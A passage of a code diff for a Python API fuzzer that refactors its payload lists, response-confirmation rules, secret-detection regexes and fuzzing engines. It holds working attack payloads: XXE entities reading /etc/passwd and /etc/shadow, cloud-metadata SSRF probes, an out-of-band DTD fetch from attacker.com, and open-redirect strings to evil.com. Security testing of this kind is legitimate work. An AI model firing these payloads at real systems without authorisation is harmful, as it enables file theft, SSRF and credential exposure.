-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-<foo>&xxe;</foo>""",
-     "label": "xxe_file_read"},
-    {"payload": """<?xml version="1.0"?>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
-<foo>&xxe;</foo>""",
-     "label": "xxe_ssrf"},
-    {"payload": """<?xml version="1.0"?>
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
-<foo>test</foo>""",
-     "label": "xxe_oob"},
-    {"payload": """<?xml version="1.0"?>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
-<foo>&xxe;</foo>""",
-     "label": "xxe_php_filter"},
-    {"payload": """<?xml version="1.0"?>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
-<foo>&xxe;</foo>""",
-     "label": "xxe_shadow"},
-    {"payload": """<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE test [<!ENTITY % init SYSTEM "data://text/plain;base64,
-ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>""",
-     "label": "xxe_base64"},
-]
-
-# ── Open Redirect ──
-OPEN_REDIRECT_PAYLOADS: list[dict] = [
-    {"payload": "https://evil.com",            "label": "redirect_external"},
-    {"payload": "//evil.com",                  "label": "redirect_protocol"},
-    {"payload": "///evil.com",                 "label": "redirect_triple_slash"},
-    {"payload": "////evil.com",                "label": "redirect_quad_slash"},
-    {"payload": "/\\evil.com",                 "label": "redirect_backslash"},
-    {"payload": "https:evil.com",              "label": "redirect_colon"},
-    {"payload": "https://evil.com%2F@target",  "label": "redirect_at"},
-    {"payload": "javascript:alert(1)",         "label": "redirect_javascript"},
-    {"payload": "data:text/html,<script>alert(1)</script>",
-     "label": "redirect_data"},
-    {"payload": "%2Fevil.com",                 "label": "redirect_enc_slash"},
-    {"payload": "%252Fevil.com",               "label": "redirect_dbl_enc"},
-]
-
-# ── HTTP Methods to fuzz ──
-ALL_HTTP_METHODS = [
-    "GET", "POST", "PUT", "PATCH", "DELETE",
-    "OPTIONS", "HEAD", "TRACE", "CONNECT",
-    "PROPFIND", "PROPPATCH", "MKCOL", "COPY",
-    "MOVE", "LOCK", "UNLOCK", "SEARCH",
-    "PURGE", "INVALIDATE", "DEBUG",
-]
-
-# ── Content-Types to fuzz ──
-CONTENT_TYPES_TO_FUZZ = [
+_CONTENT_TYPES = [
     "application/json",
     "application/x-www-form-urlencoded",
     "multipart/form-data",
@@ -438,1924 +389,1732 @@ CONTENT_TYPES_TO_FUZZ = [
     "application/soap+xml",
     "text/plain",
     "text/html",
-    "application/javascript",
-    "application/octet-stream",
     "application/graphql",
     "application/ld+json",
     "application/vnd.api+json",
-    "application/x-protobuf",
-    "application/msgpack",
-    "application/cbor",
-    "charset=utf-8",
-    "application/json; charset=utf-8",
     "application/json; charset=utf-16",
     "*/*",
     "",
 ]
 
-# ── Error signatures ──
-ERROR_SIGNATURES: dict[str, list[str]] = {
-    "sql_error": [
-        "sql syntax", "mysql_fetch", "ora-0", "postgresql error",
-        "sqlite3", "pg_query", "sqlexception", "unclosed quotation",
-        "quoted string not properly terminated", "syntax error",
-        "invalid input syntax", "division by zero",
-        "column.*does not exist", "table.*doesn't exist",
-        "you have an error in your sql",
-    ],
-    "code_error": [
-        "traceback (most recent call last)",
-        "exception in thread", "nullpointerexception",
-        "undefined method", "undefined variable",
-        "fatal error", "parse error", "stack trace",
-        "at java.lang", "at org.springframework",
-        "system.exception", "unhandled exception",
-        "warning: include", "failed to open stream",
-    ],
-    "ssti_success": [
-        "49",                  # 7*7 result
-        "7777777",             # 7*'7' in Python
-    ],
-    "path_traversal": [
-        "root:x:0:0", "daemon:x:", "nobody:x:",
-        "[fonts]", "[extensions]",              # windows ini
-        "uid=", "gid=",                         # id command output
-    ],
-    "command_injection": [
-        "uid=", "gid=", "root:", "www-data",
-        "total ", "drwxr", "-rw-r",
-    ],
-    "ssrf_success": [
-        "ami-id", "instance-id", "local-ipv4",  # AWS metadata
-        "computeMetadata",                       # GCP
-        "access_token", "expires_on",            # Azure
-    ],
+
+def _payloads(cats: Optional[list[str]] = None,
+              cap: int = 15) -> list[tuple[str, str, str]]:
+    """Return [(payload, label, category)] list."""
+    out: list[tuple[str, str, str]] = []
+    for cat in (cats or list(_P)):
+        for payload, label in _P.get(cat, [])[:cap]:
+            out.append((payload, label, cat))
+    return out
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# §4  CONFIRMATION LOGIC
+# ══════════════════════════════════════════════════════════════════════════════
+
+_SIGS: dict[str, tuple[str, str, list[str]]] = {
+    # key → (vuln_type, severity, [regex patterns])
+    "sql":  ("sqli",              "critical", [
+        r"sql syntax", r"mysql_fetch", r"ora-0\d", r"postgresql error",
+        r"sqlite3", r"sqlexception", r"unclosed quotation",
+        r"you have an error in your sql", r"invalid input syntax",
+        r"division by zero", r"column .+ does not exist",
+    ]),
+    "code": ("code_disclosure",   "high", [
+        r"traceback \(most recent call last\)", r"nullpointerexception",
+        r"fatal error", r"parse error", r"stack trace",
+        r"at java\.lang\.", r"system\.exception", r"unhandled exception",
+    ]),
+    "ssti": ("ssti",              "critical", [r"\b49\b", r"7777777"]),
+    "lfi":  ("path_traversal",   "critical", [
+        r"root:x:0:0", r"daemon:x:", r"nobody:x:", r"\[fonts\]", r"\[extensions\]",
+    ]),
+    "cmdi": ("command_injection", "critical", [
+        r"uid=\d+\(", r"gid=\d+\(", r"total \d+", r"drwxr",
+    ]),
+    "ssrf": ("ssrf",             "critical", [
+        r"ami-id", r"instance-id", r"computeMetadata", r"access_token",
+    ]),
 }
 
-# Status codes that are interesting during fuzzing
-INTERESTING_STATUS = {
-    200, 201, 202, 204,                          # success
-    301, 302, 307, 308,                          # redirects
-    400, 401, 403, 405, 406, 415, 422, 429,     # client errors
-    500, 501, 502, 503,                          # server errors
-}
+_SEV = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}
 
-VULN_STATUS = {200, 201, 500, 501}              # most interesting for vulns
-
-
-# ══════════════════════════════════════════════════════════════
-# 3. PAYLOAD BUILDER
-# ══════════════════════════════════════════════════════════════
-
-ALL_PAYLOAD_SETS: dict[str, list[dict]] = {
-    "sqli":          SQLI_PAYLOADS,
-    "xss":           XSS_PAYLOADS,
-    "ssti":          SSTI_PAYLOADS,
-    "path_traversal":PATH_TRAVERSAL_PAYLOADS,
-    "cmdi":          CMDI_PAYLOADS,
-    "overflow":      OVERFLOW_PAYLOADS,
-    "ssrf":          SSRF_PAYLOADS,
-    "xxe":           XXE_PAYLOADS,
-    "open_redirect": OPEN_REDIRECT_PAYLOADS,
-}
+# Secret-leak entropy patterns
+_SECRET_RE = [
+    re.compile(r"eyJ[A-Za-z0-9._-]{50,}"),                      # JWT
+    re.compile(r"AKIA[0-9A-Z]{16}"),                            # AWS key
+    re.compile(r"[0-9a-f]{40,}"),                               # hex token
+    re.compile(r"[A-Za-z0-9+/]{60,}={0,2}"),                   # b64 blob
+    re.compile(r'"(?:password|secret|token|api_key|apikey)"\s*:\s*"[^"]{6,}"',
+               re.I),
+]
 
 
-def build_payload_list(
-    categories: Optional[list[str]] = None,
-    limit_per_category: int = 20,
-) -> list[tuple[str, str, str]]:
+def _entropy(s: str) -> float:
+    if not s:
+        return 0.0
+    f = {}
+    for c in s:
+        f[c] = f.get(c, 0) + 1
+    n = len(s)
+    return -sum((v / n) * math.log2(v / n) for v in f.values())
+
+
+def _secrets(body: str) -> list[str]:
+    out: list[str] = []
+    for pat in _SECRET_RE:
+        for m in pat.findall(body):
+            cand = m if isinstance(m, str) else m
+            if _entropy(cand) > 4.5:
+                out.append(f"Possible secret: {cand[:60]}…")
+    return out[:3]
+
+
+def _confirm(
+    url:            str,
+    method:         str,
+    param:          Optional[str],
+    payload:        str,
+    label:          str,
+    cat:            str,
+    status:         Optional[int],
+    body:           Optional[str],
+    hdrs:           dict[str, str],
+    elapsed:        float,
+    bl_status:      Optional[int],
+    bl_len:         Optional[int],
+) -> Optional[Finding]:
     """
-    Build (payload, label, category) tuples.
-    If categories=None, use all categories.
+    Apply all confirmation rules to one HTTP response.
+    Returns a Finding if interesting, else None.
     """
-    payloads: list[tuple[str, str, str]] = []
-    cats = categories or list(ALL_PAYLOAD_SETS.keys())
-
-    for cat in cats:
-        pset = ALL_PAYLOAD_SETS.get(cat, [])
-        for item in pset[:limit_per_category]:
-            payloads.append((item["payload"], item["label"], cat))
-
-    return payloads
-
-
-def random_string(length: int = 8) -> str:
-    """Generate random string for baseline comparisons."""
-    return "".join(random.choices(string.ascii_lowercase, k=length))
-
-
-# ══════════════════════════════════════════════════════════════
-# 4. RESPONSE ANALYZER
-# ══════════════════════════════════════════════════════════════
-
-def analyze_response(
-    url: str,
-    method: str,
-    payload: str,
-    payload_type: str,
-    label: str,
-    resp_status: Optional[int],
-    resp_body: Optional[str],
-    resp_headers: dict[str, str],
-    resp_time: float,
-    baseline_status: Optional[int] = None,
-    baseline_body: Optional[str] = None,
-    baseline_len: Optional[int] = None,
-    param_name: Optional[str] = None,
-) -> FuzzResult:
-    """
-    Analyze a fuzz response for:
-    - Error signatures
-    - Payload reflection
-    - Status code anomalies
-    - Response time anomalies (time-based injection)
-    - Size anomalies
-    """
-    result = FuzzResult(
-        url=url,
-        method=method,
-        payload=payload[:200],
-        payload_type=payload_type,
-        param_name=param_name,
-        status_code=resp_status,
-        content_length=len(resp_body) if resp_body else 0,
-        response_time=resp_time,
-        content_type=resp_headers.get("content-type", ""),
-        response_snippet=(resp_body or "")[:300],
-    )
-
-    # Redirect
-    if resp_status in (301, 302, 307, 308):
-        result.redirect_url = resp_headers.get("location")
-
-    body_lower = (resp_body or "").lower()
+    body     = body or ""
+    body_lc  = body.lower()
     evidence: list[str] = []
+    vuln_type = "none"
+    severity  = "info"
 
-    # ── Error signature detection ──
-    for err_type, patterns in ERROR_SIGNATURES.items():
-        for pattern in patterns:
-            if re.search(pattern, body_lower, re.IGNORECASE):
-                result.error_detected = True
-                result.interesting    = True
-
-                if err_type == "sql_error":
-                    result.finding_type = "sql_injection"
-                    result.severity     = "critical"
-                    evidence.append(f"SQL error signature: '{pattern}'")
-
-                elif err_type == "code_error":
-                    result.finding_type = "code_disclosure"
-                    result.severity     = "high"
-                    evidence.append(f"Code error: '{pattern}'")
-
-                elif err_type == "ssti_success":
-                    if payload_type == "ssti":
-                        result.finding_type = "ssti"
-                        result.severity     = "critical"
-                        evidence.append(f"SSTI result: '{pattern}' in response")
-
-                elif err_type == "path_traversal":
-                    result.finding_type = "path_traversal"
-                    result.severity     = "critical"
-                    evidence.append(f"File content leaked: '{pattern}'")
-
-                elif err_type == "command_injection":
-                    result.finding_type = "command_injection"
-                    result.severity     = "critical"
-                    evidence.append(f"Command output: '{pattern}'")
-
-                elif err_type == "ssrf_success":
-                    result.finding_type = "ssrf"
-                    result.severity     = "critical"
-                    evidence.append(f"SSRF metadata leaked: '{pattern}'")
-
+    # ── 1. Error signature scan ──────────────────────────────────────────
+    for sig_key, (vt, sv, patterns) in _SIGS.items():
+        # SSTI patterns only confirm when the payload is actually SSTI
+        if sig_key == "ssti" and cat != "ssti":
+            continue
+        for pat in patterns:
+            if re.search(pat, body_lc, re.I):
+                vuln_type = vt
+                severity  = sv
+                evidence.append(f"[{sig_key}] matched '{pat}'")
                 break
+        if vuln_type != "none":
+            break
 
-    # ── Payload reflection (XSS) ──
-    if payload_type == "xss" and payload[:20] in (resp_body or ""):
-        result.interesting  = True
-        result.finding_type = "xss_reflection"
-        result.severity     = "high"
-        evidence.append(f"XSS payload reflected in response")
+    # ── 2. XSS reflection ────────────────────────────────────────────────
+    if cat == "xss" and payload[:20] in body:
+        vuln_type = "xss_reflection"
+        severity  = "high"
+        evidence.append("XSS payload reflected verbatim")
 
-    # ── Time-based injection ──
-    if resp_time and resp_time > 2.8:
-        if any(kw in label for kw in ("sleep", "waitfor", "time", "delay")):
-            result.interesting  = True
-            result.finding_type = "time_based_injection"
-            result.severity     = "high"
-            evidence.append(
-                f"Response time {resp_time:.2f}s > 2.8s with time payload"
-            )
+    # ── 3. Time-based injection ──────────────────────────────────────────
+    if elapsed > 2.8 and any(k in label for k in ("sleep", "waitfor", "delay")):
+        if _SEV.get(severity, 0) < _SEV["high"]:
+            vuln_type = "time_based_injection"
+            severity  = "high"
+        evidence.append(f"Elapsed {elapsed:.2f}s on time payload '{label}'")
 
-    # ── Status code anomaly ──
-    if baseline_status and resp_status:
-        if baseline_status in (401, 403) and resp_status in (200, 201, 204):
-            result.interesting  = True
-            result.finding_type = "auth_bypass"
-            result.severity     = "critical"
-            evidence.append(
-                f"Status changed from {baseline_status} to {resp_status} "
-                f"with payload"
-            )
-        elif resp_status == 500 and baseline_status != 500:
-            result.interesting  = True
-            result.finding_type = "server_error"
-            result.severity     = "medium"
-            evidence.append(f"500 error triggered by payload")
+    # ── 4. Auth bypass ───────────────────────────────────────────────────
+    if bl_status in (401, 403) and status in (200, 201, 204):
+        vuln_type = "auth_bypass"
+        severity  = "critical"
+        evidence.append(f"Status {bl_status} → {status} with payload")
 
-    # ── Size anomaly ──
-    if baseline_len and result.content_length:
-        diff = abs(result.content_length - baseline_len)
-        if diff > 500 and diff > baseline_len * 0.5:
-            result.interesting = True
-            evidence.append(
-                f"Response size anomaly: baseline={baseline_len}, "
-                f"fuzzed={result.content_length} (diff={diff})"
-            )
+    # ── 5. SSRF redirect ─────────────────────────────────────────────────
+    if cat == "ssrf" and status in (301, 302, 307, 308):
+        loc = hdrs.get("location", "")
+        if any(k in loc for k in ("169.254", "metadata", "localhost", "127.")):
+            vuln_type = "ssrf"
+            severity  = "critical"
+            evidence.append(f"SSRF redirect → {loc}")
 
-    # ── SSRF redirect ──
-    if payload_type == "ssrf" and result.redirect_url:
-        if any(kw in result.redirect_url for kw in
-               ("169.254", "metadata", "localhost", "127.0.0.1")):
-            result.interesting  = True
-            result.finding_type = "ssrf"
-            result.severity     = "critical"
-            evidence.append(f"SSRF redirect: {result.redirect_url}")
+    # ── 6. Open redirect ─────────────────────────────────────────────────
+    if cat == "redirect" and status in (301, 302, 307, 308):
+        loc = hdrs.get("location", "")
+        if "evil.com" in loc or "attacker" in loc:
+            vuln_type = "open_redirect"
+            severity  = "medium"
+            evidence.append(f"Redirect → {loc}")
 
-    # ── Open redirect ──
-    if payload_type == "open_redirect" and result.redirect_url:
-        if "evil.com" in result.redirect_url or "attacker" in result.redirect_url:
-            result.interesting  = True
-            result.finding_type = "open_redirect"
-            result.severity     = "medium"
-            evidence.append(f"Open redirect to: {result.redirect_url}")
+    # ── 7. Size anomaly ──────────────────────────────────────────────────
+    cur_len = len(body)
+    if bl_len and cur_len and bl_len > 0:
+        diff = abs(cur_len - bl_len)
+        if diff > 500 and diff > bl_len * 0.5:
+            evidence.append(f"Size Δ {diff} (baseline {bl_len} → {cur_len})")
 
-    # ── Mark all 5xx with payloads as interesting ──
-    if resp_status and resp_status >= 500 and not result.interesting:
-        result.interesting = True
-        if not result.finding_type or result.finding_type == "none":
-            result.finding_type = "server_error"
-            result.severity     = "low"
-        evidence.append(f"HTTP {resp_status} response to payload")
+    # ── 8. Secret / entropy leak ─────────────────────────────────────────
+    secrets = _secrets(body)
+    if secrets:
+        if _SEV.get(severity, 0) < _SEV["high"]:
+            vuln_type = "secret_disclosure"
+            severity  = "high"
+        evidence.extend(secrets)
 
-    result.evidence = evidence
-    return result
+    # ── 9. Generic 5xx ───────────────────────────────────────────────────
+    if status and status >= 500:
+        if vuln_type == "none":
+            vuln_type = "server_error"
+            severity  = "low"
+        evidence.append(f"HTTP {status}")
+
+    if not evidence:
+        return None
+
+    return Finding(
+        url=url, method=method, param=param,
+        payload=payload[:200], vuln_type=vuln_type,
+        severity=severity, status=status,
+        resp_time=round(elapsed, 3),
+        resp_size=len(body),
+        snippet=body[:300] if body else None,
+        evidence=evidence,
+    ).stamp()
 
 
-# ══════════════════════════════════════════════════════════════
-# 5. FUZZ ENGINES
-# ══════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════════════════
+# §5  DEDUPLICATOR
+# ══════════════════════════════════════════════════════════════════════════════
+
+class _Dedup:
+    def __init__(self) -> None:
+        self._seen: set[str] = set()
+        self._lock = threading.Lock()
+
+    def is_new(self, f: Finding) -> bool:
+        with self._lock:
+            if f._hash in self._seen:
+                return False
+            self._seen.add(f._hash)
+            return True
+
+    def reset(self) -> None:
+        with self._lock:
+            self._seen.clear()
+
+
+_DEDUP = _Dedup()
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# §6  HTTP SESSION + BASELINE
+# ══════════════════════════════════════════════════════════════════════════════
+
+def _session(headers: dict[str, str]) -> requests.Session:
+    s = requests.Session()
+    s.verify  = False
+    s.headers.update({"User-Agent": "APIFuzzer/3.0", **headers})
+    return s
+
+
+def _baseline(
+    sess: requests.Session, method: str, url: str,
+    params: Optional[dict] = None,
+    json_body: Optional[dict] = None,
+    timeout: int = 8,
+) -> tuple[Optional[int], Optional[int]]:
+    """Return (status, content_length) for baseline request."""
+    try:
+        _LIMITER.acquire()
+        r = sess.request(method, url, params=params,
+                         json=json_body, timeout=timeout)
+        return r.status_code, len(r.content)
+    except Exception:
+        return None, None
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# §7  OPENAPI INGESTION
+# ══════════════════════════════════════════════════════════════════════════════
+
+def _schema_example(t: str) -> str:
+    return {"integer": "1", "number": "1.0", "boolean": "true",
+            "array": "[]", "object": "{}"}.get(t, "test")
+
+
+def fetch_openapi(url: str, timeout: int = 10) -> dict:
+    try:
+        r = requests.get(url, timeout=timeout, verify=False)
+        r.raise_for_status()
+        return r.json()
+    except Exception as e:
+        log.warning("OpenAPI fetch failed: %s", e)
+        return {}
+
+
+def parse_openapi(spec: dict, base_url: str) -> tuple[list[str], dict[str, dict]]:
+    """Return (endpoint_urls, {url: {param: example}})."""
+    if not spec:
+        return [], {}
+
+    server = base_url
+    if "servers" in spec and spec["servers"]:
+        server = spec["servers"][0].get("url", base_url)
+    elif "basePath" in spec:
+        server = base_url.rstrip("/") + spec.get("basePath", "")
+
+    eps: list[str]              = []
+    pmap: dict[str, dict]       = {}
+
+    for path, methods_obj in spec.get("paths", {}).items():
+        full = server.rstrip("/") + path
+        eps.append(full)
+        pmap[full] = {}
+        for _method, op in methods_obj.items():
+            if not isinstance(op, dict):
+                continue
+            for param in op.get("parameters", []):
+                name = param.get("name", "")
+                loc  = param.get("in", "")
+                if name and loc in ("query", "path"):
+                    schema  = param.get("schema") or {}
+                    example = (param.get("example")
+                               or schema.get("example")
+                               or schema.get("default")
+                               or _schema_example(schema.get("type", "string")))
+                    pmap[full][name] = str(example)
+
+    log.info("OpenAPI: %d endpoints discovered", len(eps))
+    return eps, pmap
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# §8  FUZZ ENGINES
+# ══════════════════════════════════════════════════════════════════════════════
+
+_EARLY_EXIT = {"critical"}
+
+
+# ─── URL param fuzzing ──────────────────────────────────────────────────────
 
 def fuzz_url_params(
-    url: str,
-    method: str,
-    existing_params: dict[str, str],
-    headers: dict[str, str],
+    url:      str,
+    method:   str,
+    ep_params: dict[str, str],
+    sess:     requests.Session,
     payloads: list[tuple[str, str, str]],
-    timeout: int = 8,
-) -> list[FuzzResult]:
-    """
-    Fuzz URL query parameters with all payloads.
-    1. Get baseline response
-    2. Replace each param value with each payload
-    3. Analyze differences
-    """
-    results: list[FuzzResult] = []
+    timeout:  int = 8,
+) -> list[Finding]:
+    findings: list[Finding] = []
 
-    # Baseline
-    try:
-        baseline = requests.request(
-            method, url, params=existing_params,
-            headers=headers, timeout=timeout, verify=False,
-        )
-        bl_status = baseline.status_code
-        bl_body   = baseline.text[:3000]
-        bl_len    = len(baseline.content)
-    except Exception:
-        bl_status, bl_body, bl_len = None, None, None
+    to_fuzz = list(ep_params.keys()) if ep_params else [
+        "id", "user", "file", "url", "path",
+        "q", "search", "page", "redirect", "data",
+    ]
+    bl_status, bl_len = _baseline(sess, method, url, ep_params or None,
+                                   None, timeout)
 
-    # Fuzz each param
-    params_to_fuzz = list(existing_params.keys()) if existing_params \
-        else ["id", "user", "file", "url", "path", "q", "search",
-              "page", "redirect", "next", "data"]
-
-    for param in params_to_fuzz:
+    for param in to_fuzz:
+        stop = False
         for payload, label, cat in payloads:
-            fuzz_params = {**existing_params, param: payload}
-            start = time.time()
+            if stop:
+                break
+            _LIMITER.acquire()
+            fuzz_p = {**ep_params, param: payload}
+            t0 = time.monotonic()
             try:
-                resp = requests.request(
-                    method, url, params=fuzz_params,
-                    headers=headers, timeout=timeout,
-                    verify=False, allow_redirects=False,
+                r = sess.request(method, url, params=fuzz_p,
+                                 timeout=timeout, allow_redirects=False)
+                f = _confirm(
+                    url=f"{url}?{param}=…", method=method, param=param,
+                    payload=payload, label=label, cat=cat,
+                    status=r.status_code,
+                    body=r.text[:3000],
+                    hdrs={k.lower(): v for k, v in r.headers.items()},
+                    elapsed=time.monotonic() - t0,
+                    bl_status=bl_status, bl_len=bl_len,
                 )
-                elapsed = round(time.time() - start, 3)
-                result  = analyze_response(
-                    url=f"{url}?{param}={payload[:30]}",
-                    method=method,
-                    payload=payload,
-                    payload_type=cat,
-                    label=label,
-                    resp_status=resp.status_code,
-                    resp_body=resp.text[:3000],
-                    resp_headers={k.lower(): v for k, v in resp.headers.items()},
-                    resp_time=elapsed,
-                    baseline_status=bl_status,
-                    baseline_body=bl_body,
-                    baseline_len=bl_len,
-                    param_name=param,
-                )
-                if result.interesting or result.error_detected:
-                    results.append(result)
+                if f and _DEDUP.is_new(f):
+                    findings.append(f)
+                    if f.severity in _EARLY_EXIT:
+                        stop = True
 
-            except requests.exceptions.Timeout:
-                # Timeout itself might indicate blind injection
-                if any(kw in label for kw in ("sleep", "time", "delay", "waitfor")):
-                    results.append(FuzzResult(
-                        url=url, method=method,
-                        payload=payload[:100], payload_type=cat,
-                        param_name=param,
-                        response_time=timeout,
-                        interesting=True,
-                        finding_type="time_based_injection",
-                        severity="high",
-                        evidence=[f"Timeout on time-based payload: {label}"],
-                    ))
-            except Exception:
-                pass
+            except requests.Timeout:
+                if any(k in label for k in ("sleep", "waitfor", "delay")):
+                    f = Finding(
+                        url=url, method=method, param=param,
+                        payload=payload[:100], vuln_type="time_based_injection",
+                        severity="high", resp_time=float(timeout),
+                        evidence=[f"Timeout on '{label}'"],
+                    ).stamp()
+                    if _DEDUP.is_new(f):
+                        findings.append(f)
+            except Exception as e:
+                log.debug("url_params: %s", e)
 
-    return results
+    return findings
+
+
+# ─── Body param fuzzing ─────────────────────────────────────────────────────
+
+def _body_request(
+    sess: requests.Session, method: str, url: str,
+    fields: dict, body_type: str, ct_header: str,
+    timeout: int,
+) -> requests.Response:
+    hdrs = {"Content-Type": ct_header}
+    if body_type == "json":
+        return sess.request(method, url, json=fields, headers=hdrs,
+                            timeout=timeout, allow_redirects=False)
+    return sess.request(method, url, data=fields, headers=hdrs,
+                        timeout=timeout, allow_redirects=False)
 
 
 def fuzz_body_params(
-    url: str,
-    method: str,
+    url:      str,
+    method:   str,
     base_body: Optional[str],
-    content_type: str,
-    headers: dict[str, str],
+    ct:       str,
+    sess:     requests.Session,
     payloads: list[tuple[str, str, str]],
-    timeout: int = 8,
-) -> list[FuzzResult]:
-    """
-    Fuzz request body parameters.
-    Handles JSON, form-encoded, XML bodies.
-    """
-    results: list[FuzzResult] = []
+    timeout:  int = 8,
+) -> list[Finding]:
+    findings: list[Finding] = []
 
-    req_headers = {
-        **headers,
-        "Content-Type": content_type,
-    }
-
-    # Parse baseline body
     body_fields: dict[str, Any] = {}
-    body_type = "raw"
+    body_type = "json"
 
     if base_body:
-        if "json" in content_type:
+        if "json" in ct:
             try:
-                body_fields = json.loads(base_body)
-                body_type   = "json"
+                obj = json.loads(base_body)
+                if isinstance(obj, dict):
+                    body_fields = obj
             except Exception:
-                pass
-        elif "x-www-form-urlencoded" in content_type:
-            from urllib.parse import parse_qs, urlencode
-            parsed = parse_qs(base_body)
-            body_fields = {k: v[0] for k, v in parsed.items()}
+                body_fields = {"data": base_body}
+        elif "form" in ct:
+            body_fields = {k: v[0] for k, v in parse_qs(base_body).items()}
             body_type   = "form"
+        else:
+            body_fields = {"data": base_body}
     else:
-        # Default fields to fuzz
         body_fields = {
             "id": "1", "user": "admin", "username": "admin",
             "email": "test@test.com", "url": "http://example.com",
             "file": "test.txt", "path": "/", "data": "test",
-            "query": "test", "search": "test", "input": "test",
+            "query": "test", "search": "test",
         }
-        body_type = "json"
 
-    # Baseline request
+    bl_status, bl_len = None, None
     try:
-        if body_type == "json":
-            bl_resp = requests.request(
-                method, url, json=body_fields,
-                headers=req_headers, timeout=timeout, verify=False,
-            )
-        else:
-            bl_resp = requests.request(
-                method, url, data=body_fields,
-                headers=req_headers, timeout=timeout, verify=False,
-            )
-        bl_status = bl_resp.status_code
-        bl_body   = bl_resp.text[:3000]
-        bl_len    = len(bl_resp.content)
-    except Exception:
-        bl_status, bl_body, bl_len = None, None, None
-
-    # Fuzz each field
-    for field in list(body_fields.keys()):
-        for payload, label, cat in payloads:
-            fuzz_fields = {**body_fields, field: payload}
-            start = time.time()
-            try:
-                if body_type == "json":
-                    resp = requests.request(
-                        method, url, json=fuzz_fields,
-                        headers=req_headers, timeout=timeout,
-                        verify=False, allow_redirects=False,
-                    )
-                else:
-                    resp = requests.request(
-                        method, url, data=fuzz_fields,
-                        headers=req_headers, timeout=timeout,
-                        verify=False, allow_redirects=False,
-                    )
-                elapsed = round(time.time() - start, 3)
-                result  = analyze_response(
-                    url=url,
-                    method=method,
-                    payload=payload,
-                    payload_type=cat,
-                    label=label,
-                    resp_status=resp.status_code,
-                    resp_body=resp.text[:3000],
-                    resp_headers={k.lower(): v for k, v in resp.headers.items()},
-                    resp_time=elapsed,
-                    baseline_status=bl_status,
-                    baseline_body=bl_body,
-                    baseline_len=bl_len,
-                    param_name=field,
-                )
-                if result.interesting or result.error_detected:
-                    results.append(result)
-
-            except requests.exceptions.Timeout:
-                if any(kw in label for kw in ("sleep", "time", "delay", "waitfor")):
-                    results.append(FuzzResult(
-                        url=url, method=method,
-                        payload=payload[:100], payload_type=cat,
-                        param_name=field,
-                        response_time=timeout,
-                        interesting=True,
-                        finding_type="time_based_injection",
-                        severity="high",
-                        evidence=[
-                            f"Body field '{field}': timeout on "
-                            f"time-based payload '{label}'"
-                        ],
-                    ))
-            except Exception:
-                pass
-
-    return results
-
-
-def fuzz_http_methods(
-    url: str,
-    headers: dict[str, str],
-    expected_method: str = "GET",
-    timeout: int = 8,
-) -> MethodFuzzResult:
-    """
-    Test all HTTP methods on an endpoint.
-    Detect: unexpected methods allowed, dangerous methods (TRACE/DEBUG),
-    method tunneling via headers.
-    """
-    result = MethodFuzzResult(endpoint=url)
-
-    # First get OPTIONS
-    try:
-        opts = requests.options(
-            url, headers=headers, timeout=timeout, verify=False
-        )
-        allow_hdr = (
-            opts.headers.get("Allow") or
-            opts.headers.get("allow") or
-            opts.headers.get("Access-Control-Allow-Methods") or ""
-        )
-        result.options_response = allow_hdr
-        if allow_hdr:
-            result.evidence.append(f"OPTIONS Allow: {allow_hdr}")
-    except Exception:
-        pass
-
-    # Test each method
-    dangerous_methods = {"TRACE", "DEBUG", "CONNECT",
-                          "PROPFIND", "PROPPATCH", "COPY", "MOVE"}
-    write_methods     = {"PUT", "DELETE", "PATCH"}
-
-    for method in ALL_HTTP_METHODS:
-        result.methods_tested.append(method)
-        try:
-            resp = requests.request(
-                method, url,
-                headers={**headers, "User-Agent": "APIFuzzer/1.0"},
-                timeout=timeout,
-                verify=False,
-                allow_redirects=False,
-                data="test_body_for_method_fuzz" if method in
-                     ("POST", "PUT", "PATCH") else None,
-            )
-
-            # Method is "allowed" if not 405 or 501
-            if resp.status_code not in (405, 501, 404, 400, 403):
-                result.methods_allowed.append(method)
-
-                # Flag unexpected methods
-                if method != expected_method:
-                    if method in dangerous_methods:
-                        result.vulnerable = True
-                        result.methods_unexpected.append(method)
-                        result.evidence.append(
-                            f"DANGEROUS method {method} allowed: "
-                            f"HTTP {resp.status_code}"
-                        )
-                    elif method in write_methods and resp.status_code in (200, 201, 204):
-                        result.vulnerable = True
-                        result.methods_unexpected.append(method)
-                        result.evidence.append(
-                            f"Write method {method} allowed: "
-                            f"HTTP {resp.status_code}"
-                        )
-                    elif method == "TRACE":
-                        # XST (Cross-Site Tracing)
-                        if "TRACE" in (resp.text or ""):
-                            result.vulnerable = True
-                            result.evidence.append(
-                                "TRACE method enabled → XST risk"
-                            )
-
-        except Exception:
-            pass
-
-    # Test method override via headers
-    override_headers_map = {
-        "X-HTTP-Method-Override": "DELETE",
-        "X-Method-Override":      "PUT",
-        "_method":                "DELETE",
-    }
-    for hdr, method in override_headers_map.items():
-        try:
-            resp = requests.get(
-                url,
-                headers={**headers, hdr: method},
-                timeout=timeout,
-                verify=False,
-            )
-            # Compare to plain GET
-            plain = requests.get(url, headers=headers,
-                                 timeout=timeout, verify=False)
-            if resp.status_code != plain.status_code:
-                result.vulnerable = True
-                result.evidence.append(
-                    f"Method override via '{hdr}: {method}' "
-                    f"changed: {plain.status_code} → {resp.status_code}"
-                )
-        except Exception:
-            pass
-
-    return result
-
-
-def fuzz_content_types(
-    url: str,
-    method: str,
-    base_body: str,
-    base_headers: dict[str, str],
-    timeout: int = 8,
-) -> ContentTypeFuzzResult:
-    """
-    Test all content-types on an endpoint.
-    Detect: content-type bypass, type confusion, XXE via XML type.
-    """
-    result = ContentTypeFuzzResult(endpoint=url, method=method)
-
-    # Baseline (JSON)
-    try:
